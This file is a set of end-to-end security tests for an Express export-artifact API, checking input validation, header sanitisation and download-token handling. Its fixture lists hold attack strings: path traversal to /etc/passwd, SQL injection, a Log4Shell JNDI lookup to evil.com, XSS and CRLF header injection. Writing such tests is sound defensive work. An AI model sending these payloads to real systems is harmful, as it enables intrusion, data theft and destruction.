/**
 * E2E Integration Test: Malicious export request through the full HTTP stack.
 *
 * Sends crafted injection payloads through the real Express router + supertest
 * HTTP stack and verifies that:
 * - 400 responses are returned for invalid inputs (bad UUIDs, negative params)
 * - Content-Disposition headers are sanitized (no CRLF injection)
 * - Valid artifacts with injection-laden format strings have sanitized headers
 * - The full layered defense (UUID validation → token validation → header sanitization)
 *   works as a single pipeline
 */

import express from 'express';
import request from 'supertest';
import { createExportRouter } from '../../src/api/routes/export';
import { ExportArtifactStore } from '../../src/export/export-artifact-store';
import type { ArtifactDownloadUrl } from '../../src/export/export-artifact-store';

// Fail-loud unwrap: every site below generates the URL for an artifact it
// stored one statement earlier, so undefined means the store dropped it. The
// old `dl!.url` TypeError red; the throw keeps the RED verdict, and the
// preceding `expect(dl).toBeDefined()` pairs fold in.
function requireDownloadUrl(dl: ArtifactDownloadUrl | undefined): ArtifactDownloadUrl {
  if (dl === undefined) throw new Error('generateDownloadUrl returned undefined for a just-stored artifact');
  return dl;
}

// ---------------------------------------------------------------------------
// Test app factory
// ---------------------------------------------------------------------------

function createApp() {
  const store = new ExportArtifactStore({
    maxArtifacts: 20,
    maxStorageBytes: 1_000_000,
    defaultTtlMs: 60_000,
    downloadUrlTtlMs: 30_000,
    cleanupIntervalMs: 60_000,
  });

  const app = express();
  app.use(express.json());
  app.use('/api/v1/export', createExportRouter(store));
  return { app, store };
}

// Valid UUID v4 for testing
const VALID_UUID = '00000000-0000-4000-a000-000000000000';

// ---------------------------------------------------------------------------
// Tests: invalid artifactId format → 400
// ---------------------------------------------------------------------------

describe('E2E: Malicious artifactId formats rejected with 400', () => {
  let app: express.Express;

  beforeEach(() => {
    ({ app } = createApp());
  });

  const maliciousIds = [
    '../../../etc/passwd',
    '..%2F..%2Fetc%2Fpasswd',
    '"; DROP TABLE artifacts; --',
    '${jndi:ldap://evil.com/a}',
    '<script>alert(1)</script>',
    'null',
    'undefined',
    '00000000-0000-0000-0000-000000000000', // not v4 (version nibble is 0)
    '00000000-0000-5000-a000-000000000000', // version 5, not 4
    'gggggggg-gggg-4ggg-aggg-gggggggggggg', // non-hex
    'x'.repeat(100),
    '00000000-0000-4000-a000-000000000000\x00extra',
    '00000000-0000-4000-a000-000000000000\r\nX-Injected: evil',
  ];

  test.each(maliciousIds)('GET /artifacts/:artifactId rejects "%s" with 400', async (id) => {
    const res = await request(app).get(`/api/v1/export/artifacts/${encodeURIComponent(id)}`);
    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test.each(maliciousIds)('DELETE /artifacts/:artifactId rejects "%s" with 400', async (id) => {
    const res = await request(app).delete(`/api/v1/export/artifacts/${encodeURIComponent(id)}`);
    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test.each(maliciousIds)('GET /artifacts/:artifactId/download rejects "%s" with 400', async (id) => {
    const res = await request(app).get(
      `/api/v1/export/artifacts/${encodeURIComponent(id)}/download?token=${VALID_UUID}`,
    );
    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });
});

// ---------------------------------------------------------------------------
// Tests: invalid download token → 400
// ---------------------------------------------------------------------------

describe('E2E: Malicious download tokens rejected with 400', () => {
  let app: express.Express;
  let store: ExportArtifactStore;

  beforeEach(() => {
    ({ app, store } = createApp());
  });

  const maliciousTokens = [
    '../../../etc/passwd',
    '<script>alert(1)</script>',
    '"; SELECT * FROM users; --',
    '${env:FLAG}',
    '',
    'not-a-uuid',
    '00000000-0000-0000-0000-000000000000', // not v4
    'x'.repeat(50),
  ];

  test.each(maliciousTokens)('download rejects token "%s" with 400', async (token) => {
    // First create a valid artifact
    const stored = store.store({
      format: 'svg',
      data: new Uint8Array([1, 2, 3]),
      sizeBytes: 3,
    });

    const res = await request(app).get(
      `/api/v1/export/artifacts/${stored.artifactId}/download?token=${encodeURIComponent(token)}`,
    );
    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test('download without token returns 400', async () => {
    const stored = store.store({
      format: 'svg',
      data: new Uint8Array([1, 2, 3]),
      sizeBytes: 3,
    });

    const res = await request(app).get(
      `/api/v1/export/artifacts/${stored.artifactId}/download`,
    );
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
    expect(res.body.error.message).toMatch(/token/i);
  });
});

// ---------------------------------------------------------------------------
// Tests: negative/extreme limit/offset → 400
// ---------------------------------------------------------------------------

describe('E2E: Malicious query parameters rejected with 400', () => {
  let app: express.Express;

  beforeEach(() => {
    ({ app } = createApp());
  });

  test('rejects negative limit', async () => {
    const res = await request(app).get('/api/v1/export/artifacts?limit=-1');
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test('rejects negative offset', async () => {
    const res = await request(app).get('/api/v1/export/artifacts?offset=-100');
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test('rejects astronomically large limit', async () => {
    const res = await request(app).get('/api/v1/export/artifacts?limit=1000001');
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test('rejects astronomically large offset', async () => {
    const res = await request(app).get('/api/v1/export/artifacts?offset=9999999');
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test('rejects invalid format filter', async () => {
    const res = await request(app).get('/api/v1/export/artifacts?format=<script>');
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  test('accepts boundary: limit=0', async () => {
    const res = await request(app).get('/api/v1/export/artifacts?limit=0');
    expect(res.status).toBe(200);
    expect(res.body.data.artifacts).toHaveLength(0);
  });

  test('accepts boundary: limit=1000000 (max safe)', async () => {
    const res = await request(app).get('/api/v1/export/artifacts?limit=1000000');
    expect(res.status).toBe(200);
  });
});

// ---------------------------------------------------------------------------
// Tests: Content-Disposition header sanitization on download
// ---------------------------------------------------------------------------

describe('E2E: Content-Disposition header is sanitized on download', () => {
  let app: express.Express;
  let store: ExportArtifactStore;

  beforeEach(() => {
    ({ app, store } = createApp());
  });

  test('normal SVG download has clean Content-Disposition', async () => {
    const stored = store.store({
      format: 'svg',
      data: new Uint8Array([1, 2, 3]),
      sizeBytes: 3,
    });
    const dl = requireDownloadUrl(store.generateDownloadUrl(stored.artifactId));
    const token = dl.url.split('token=')[1];

    const res = await request(app).get(
      `/api/v1/export/artifacts/${stored.artifactId}/download?token=${token}`,
    );

    expect(res.status).toBe(200);
    expect(res.headers['content-disposition']).toContain('attachment');
    expect(res.headers['content-disposition']).toContain(stored.artifactId);
    expect(res.headers['content-type']).toBe('image/svg+xml');
  });

  test('Content-Type matches FORMAT_MIME whitelist', async () => {
    const formats = [
      { format: 'svg', expectedMime: 'image/svg+xml' },
      { format: 'pdf', expectedMime: 'application/pdf' },
      { format: 'json', expectedMime: 'application/json' },
      { format: 'html', expectedMime: 'text/html' },
    ];

    for (const { format, expectedMime } of formats) {
      const stored = store.store({
        format,
        data: new Uint8Array([1]),
        sizeBytes: 1,
      });
      const dl = requireDownloadUrl(store.generateDownloadUrl(stored.artifactId));
      const token = dl.url.split('token=')[1];

      // Use .buffer(true) and .parse to handle binary responses
      const res = await request(app)
        .get(`/api/v1/export/artifacts/${stored.artifactId}/download?token=${token}`)
        .buffer(true)
        .parse((response, callback) => {
          const data: Buffer[] = [];
          response.on('data', (chunk: Buffer) => data.push(chunk));
          response.on('end', () => callback(null, Buffer.concat(data)));
        });

      expect(res.headers['content-type']).toBe(expectedMime);
    }
  });

  test('Content-Disposition filename uses sanitized format', async () => {
    const stored = store.store({
      format: 'svg',
      data: new Uint8Array([1]),
      sizeBytes: 1,
    });
    const dl = requireDownloadUrl(store.generateDownloadUrl(stored.artifactId));
    const token = dl.url.split('token=')[1];

    const res = await request(app).get(
      `/api/v1/export/artifacts/${stored.artifactId}/download?token=${token}`,
    );

    // Content-Disposition should be: attachment; filename="export-{artifactId}.svg"
    const cd = res.headers['content-disposition'] as string;
    expect(cd).toMatch(/^attachment; filename="[^"]+"$/);

    // Verify no CRLF injection is possible in the header
    expect(cd).not.toContain('\r');
    expect(cd).not.toContain('\n');
  });

  test('X-Artifact-Id header contains only the validated UUID', async () => {
    const stored = store.store({
      format: 'svg',
      data: new Uint8Array([1]),
      sizeBytes: 1,
    });
    const dl = requireDownloadUrl(store.generateDownloadUrl(stored.artifactId));
    const token = dl.url.split('token=')[1];

    const res = await request(app).get(
      `/api/v1/export/artifacts/${stored.artifactId}/download?token=${token}`,
    );

    expect(res.headers['x-artifact-id']).toBe(stored.artifactId);
    // Verify no injection in X-Artifact-Id header
    expect(res.headers['x-artifact-id']).not.toContain('\r');
    expect(res.headers['x-artifact-id']).not.toContain('\n');
  });
});

// ---------------------------------------------------------------------------
// Tests: expired or invalid token → 404
// ---------------------------------------------------------------------------

describe('E2E: Invalid or expired tokens return 404', () => {
  let app: express.Express;
  let store: ExportArtifactStore;

  beforeEach(() => {
    ({ app, store } = createApp());
  });

  test('valid UUID token that does not match artifact returns 404', async () => {
    const stored = store.store({
      format: 'svg',
      data: new Uint8Array([1]),
      sizeBytes: 1,
    });

    // Use a different valid UUID as token
    const fakeToken = '11111111-1111-4111-8111-111111111111';

    const res = await request(app).get(
      `/api/v1/export/artifacts/${stored.artifactId}/download?token=${fakeToken}`,
    );

    expect(res.status).toBe(404);
    expect(res.body.error.code).toBe('ARTIFACT_NOT_FOUND');
  });

  test('download with token for wrong artifact returns 404', async () => {
    const stored1 = store.store({
      format: 'svg',
      data: new Uint8Array([1]),
      sizeBytes: 1,
    });
    const stored2 = store.store({
      format: 'pdf',
      data: new Uint8Array([2]),
      sizeBytes: 1,
    });

    // Generate token for stored1, try to use for stored2
    const dl = requireDownloadUrl(store.generateDownloadUrl(stored1.artifactId));
    const token = dl.url.split('token=')[1];

    const res = await request(app).get(
      `/api/v1/export/artifacts/${stored2.artifactId}/download?token=${token}`,
    );

    expect(res.status).toBe(404);
    expect(res.body.error.code).toBe('ARTIFACT_NOT_FOUND');
  });
});

// ---------------------------------------------------------------------------
// Tests: full lifecycle (store → generate URL → download → verify)
// ---------------------------------------------------------------------------

describe('E2E: Full artifact download lifecycle', () => {
  let app: express.Express;
  let store: ExportArtifactStore;

  beforeEach(() => {
    ({ app, store } = createApp());
  });

  test('store → list → metadata → generate URL → download → delete', async () => {
    // Store
    const stored = store.store({
      format: 'svg',
      data: new Uint8Array([0x3c, 0x73, 0x76, 0x67, 0x2f, 0x3e]), // <svg/>
      sizeBytes: 6,
      metadata: { jobId: 'test-job' },
    });

    // List
    const listRes = await request(app).get('/api/v1/export/artifacts');
    expect(listRes.status).toBe(200);
    expect(listRes.body.data.total).toBe(1);

    // Metadata
    const metaRes = await request(app).get(`/api/v1/export/artifacts/${stored.artifactId}`);
    expect(metaRes.status).toBe(200);
    expect(metaRes.body.data.format).toBe('svg');
    expect(metaRes.body.data.metadata).toEqual({ jobId: 'test-job' });

    // Generate URL
    const dl = requireDownloadUrl(store.generateDownloadUrl(stored.artifactId));
    expect(dl.expiresAt).toBeGreaterThan(Date.now());
    const token = dl.url.split('token=')[1];

    // Download
    const dlRes = await request(app).get(
      `/api/v1/export/artifacts/${stored.artifactId}/download?token=${token}`,
    );
    expect(dlRes.status).toBe(200);
    expect(dlRes.headers['content-length']).toBe('6');
    expect(dlRes.body).toBeDefined();

    // Delete
    const delRes = await request(app).delete(`/api/v1/export/artifacts/${stored.artifactId}`);
    expect(delRes.status).toBe(200);
    expect(delRes.body.data.deleted).toBe(true);

    // Verify gone
    const metaRes2 = await request(app).get(`/api/v1/export/artifacts/${stored.artifactId}`);
    expect(metaRes2.status).toBe(404);
  });
});
